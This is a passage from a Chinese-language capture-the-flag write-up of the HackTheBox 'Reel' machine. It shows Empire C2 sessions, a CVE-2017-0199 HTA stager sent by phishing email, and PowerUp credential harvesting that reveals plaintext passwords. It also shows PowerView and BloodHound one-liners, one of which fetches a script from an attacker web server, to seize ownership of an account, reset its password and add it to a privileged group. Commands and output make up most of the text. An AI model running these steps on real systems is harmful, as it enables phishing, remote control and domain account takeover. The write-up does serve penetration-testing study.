    (Empire: listeners/http) > back
    (Empire: listeners) > usestager windows/hta
    (Empire: stager/windows/hta) > set Listener http
    (Empire: stager/windows/hta) > set OutFile /home/Rogerd/tools/CVE-2017-0199/reel.hta
    (Empire: stager/windows/hta) > generate
    [*] Stager output written out to: /home/Rogerd/tools/CVE-2017-0199/reel.hta
我们把reel.hta移动到tmp目录  
然后启动python -m SimpleHTTPServer 8000  
在使用sendEmail -f PI:EMAIL -t PI:EMAIL -u RTF -m 'open
file!' -a TEST.RTF -s 10.10.10.77  
我们已经拿到回弹回来的shell了  
通过查看桌面发现几个文件，user.txt是第一个flag
    (Empire: stager/windows/hta) > agents
    [*] Active agents:
     Name     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen
     ----     -- -----------     ------------      --------                -------            ---    -----    ---------     G25L3MWT ps 10.10.10.77     REEL              HTB\nico                powershell         2468   5/0.0    2019-01-23 11:49:22
    (Empire: agents) > interact G25L3MWT
查看cred.xml文件,这是一个powershell 远程管理的密码凭据
    (Empire: G25L3MWT) > shell Get-Content cred.xml
    [*] Tasked G25L3MWT to run TASK_SHELL
    [*] Agent G25L3MWT tasked with task ID 19
    (Empire: G25L3MWT) > [*] Agent G25L3MWT returned results.
          System.Management.Automation.PSCredential
          System.Object
        System.Management.Automation.PSCredential
          HTB\Tom
          01000000d08c9ddf0115d1118c7a00c04fc297eb01000000e4a07bc7aaeade47925c42c8be5870730000000002000000000003660000c000000010000000d792a6f34a55235c22da98b0c041ce7b0000000004800000a00000001000000065d20f0b4ba5367e53498f0209a3319420000000d4769a161c2794e19fcefff3e9c763bb3a8790deebf51fc51062843b5d52e40214000000ac62dab09371dc4dbfd763fea92b9d5444748692
    ..Command execution completed.
通过这个cred.xml文件，我们查看tom的账户信息。  
我们可以使用allchecks ， 列举一些信息。我们可以看到nico的ssh服务的账号密码
    (Empire: 7H9GMEV2) > usemodule privesc/powerup/allchecks
    (Empire: powershell/privesc/powerup/allchecks) > run
    [*] Tasked 7H9GMEV2 to run TASK_CMD_JOB
    [*] Agent 7H9GMEV2 tasked with task ID 26
    [*] Tasked agent 7H9GMEV2 to run module powershell/privesc/powerup/allchecks
    (Empire: powershell/privesc/powerup/allchecks) > [*] Agent 7H9GMEV2 returned results.
    Job started: 64FXBN
    [*] Valid results returned by 10.10.10.77
    [*] Running Invoke-AllChecks
    [*] Checking if user is in a local group with administrative privileges...
    [*] Checking for unquoted service paths...
    ServiceName    : ssh-agent
    Path           : C:\Program Files\OpenSSH\ssh-agent.exe
    ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=AppendData/AddSubdirectory}
    StartName      : LocalSystem
    AbuseFunction  : Write-ServiceBinary -Name 'ssh-agent' -Path 
    CanRestart     : False
    ServiceName    : ssh-agent
    Path           : C:\Program Files\OpenSSH\ssh-agent.exe
    ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=WriteData/AddFile}
    StartName      : LocalSystem
    AbuseFunction  : Write-ServiceBinary -Name 'ssh-agent' -Path 
    CanRestart     : False
    ServiceName    : sshd
    Path           : C:\Program Files\OpenSSH\sshd.exe
    ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=AppendData/AddSubdirectory}
    StartName      : NT SERVICE\SSHD
    AbuseFunction  : Write-ServiceBinary -Name 'sshd' -Path 
    CanRestart     : False
    ServiceName    : sshd
    Path           : C:\Program Files\OpenSSH\sshd.exe
    ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=WriteData/AddFile}
    StartName      : NT SERVICE\SSHD
    AbuseFunction  : Write-ServiceBinary -Name 'sshd' -Path 
    CanRestart     : False
    DefaultDomainName    : HTB
    DefaultUserName      : nico
    DefaultPassword      : 4dri@na2017!**
    AltDefaultDomainName : 
    AltDefaultUserName   : 
    AltDefaultPassword   : 
    [*] Checking for modifidable registry autoruns and configs...
    [*] Checking for modifiable schtask files/configs...
    [*] Checking for unattended install files...
    UnattendPath : C:\Windows\Panther\Unattend.xml
我们通过ssh访问tom  
ssh PI:EMAIL  
1ts-mag1c!!!
在tom->Desktop->AD Audit->note.txt  
大概的内容是提示我们找一个最短的攻击路径。
    Findings:
    Surprisingly no AD attack paths from user to Domain Admin (using default shortest path query).
    Maybe we should re-run Cypher query against other groups we've created.
我们在tom->Desktop->AD Audit->BloodHound，我们查了一下资料了解到：  
BloodHound使用图论来揭示Active
Directory环境中隐藏的和通常无意的关系。攻击可以使用BloodHound轻松识别高度复杂的攻击路径，否则无法快速识别。防御者可以使用BloodHound来识别和消除那些相同的攻击路径。蓝队和红队都可以使用BloodHound轻松深入了解Active
Directory环境中的权限关系。  
安装BloodHound:  
我们通过登陆tom  
SharpHound.ps1替换这个文件（在这之前我们要把下载好的BloodHound->Ingestors->SharpHound.ps1放入8000web目录下。）  
powershell "IEX (New-Object
Net.Webclient).DownloadFile('')"  
我们使用SharpHound.ps1生成一个报告并且下载下来  
powershell -exec bypass  
Import-Module ./SharpHound.ps1  
invoke-bloodhound all  
我们把生成好的报告下载下来，然后拖入BloodHound  
scp -P 22 PI:EMAIL:"\"/C:/Users/tom/Desktop/AD
Audit/BloodHound/Ingestors/20190124161418_BloodHound.zip\"" /tmp/  
我们可以看到一共有18个用户，61个组  
可以查看不同用户组的信息，我们查看backup_admin  
我们通过搜索PI:EMAIL  
设置set as starting Node 为tom  
设置set as ending node 为backup_admin  
可以看到，我们可以通过CLAIRE去访问backup_admin,然后tom拥有CLAIRE  
我们可以右键WriteOwner打开hepl->info查看详细的信息  
tom可以修改claire所有者、claire拥有backup_admin的写权限。
    The user PI:EMAIL has the ability to modify the owner of the user CLAIRE@HTB.LOCAL. Object owners retain the ability to modify object security descriptors, regardless of permissions on the object's DACL.
我们可以先拿到claire再去拿backup_admin  
这里提供了一个思路，通过PowerView更改所有权  
我们可以参考powerview里面的文档进行配置  
Set-DomainObjectOwner可以设置对象所有者的配置  
Add-DomainObjectAcl可以写入DACL的配置  
Set-DomainUserPassword可以使用重置用户密码的功能
1、选择Tom为Claire对象的所有者  
2、允许Tom重置Claire密码。  
3、修改密码
    powershell -command "import-module .\PowerView.ps1; Set-DomainObjectOwner -Identity claire -OwnerIdentity Tom -Verbose; Add-DomainObjectAcl -TargetIdentity claire -PrincipalIdentity Tom -Rights ResetPassword -Verbose; $pass=ConvertTo-SecureString "AbC!@#123" -AsPlainText -Force; Set-DomainUserPassword -Identity claire -AccountPassword $pass -Verbose"
我们参考攻击路径，把Claire放入Backup_admin组。  
目录下没有powerview.ps1 ,我们从kali下载下来
    powershell "IEX (New-Object Net.Webclient).DownloadFile('http://10.10.14.19:8000/PowerView.ps1','PowerView.ps1')"
    powershell -command "import-module .\PowerView.ps1; Add-DomainObjectAcl -TargetIdentity claire -PrincipalIdentity claire -Rights All -Verbose; Add-DomainGroupMember -Identity 'Backup_Admins' -Members 'claire' -Verbose"
这时候我们可以访问Administrator->Backup_Script文件夹了。  
但是还是不能查看root.txt  
这时候我们看到Backup_Script目录下有几个脚本，其中Backup_Script.ps1是一个备份脚本，可以拿到关键信息。  
参考：  